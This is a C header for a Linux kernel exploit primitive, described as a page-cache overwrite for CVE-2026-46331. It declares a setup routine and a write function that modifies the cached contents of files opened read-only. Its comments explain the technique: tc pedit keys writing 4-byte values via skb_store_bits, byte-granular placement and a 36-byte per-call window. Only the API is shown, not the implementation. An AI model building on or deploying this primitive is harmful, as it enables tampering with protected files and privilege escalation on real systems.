/*
 * pedit_primitive.h -- CVE-2026-46331 page-cache overwrite primitive.
 *
 * Native write unit is 4 bytes (one pedit key == one u32 via skb_store_bits);
 * 1-byte granularity is reachable by masking 3 of the 4 bytes. This API uses a
 * clean 4-byte slot with byte-granular placement.
 */
#ifndef PEDIT_PRIMITIVE_H
#define PEDIT_PRIMITIVE_H

#include <stdint.h>
#include <sys/types.h>

#define PEDIT_SLOT       4      /* bytes per pedit key */
#define PEDIT_MAX_WRITE  36     /* per-call window = hoffset - base - 4 (ihl 15) */

/* Bring lo up, open the loopback listener, calibrate the skb->file offset
 * delta. Returns 0 on success, -1 on failure. */
int setup(void);

/* Overwrite [offset, offset+size) of fd's page cache with src. fd may be
 * O_RDONLY. size must be a multiple of PEDIT_SLOT and <= PEDIT_MAX_WRITE, else
 * the call is refused. Idempotent. Returns 0 on success, -1 otherwise. */
int api_fd_write(int fd, off_t offset, const void *src, size_t size);

#endif /* PEDIT_PRIMITIVE_H */
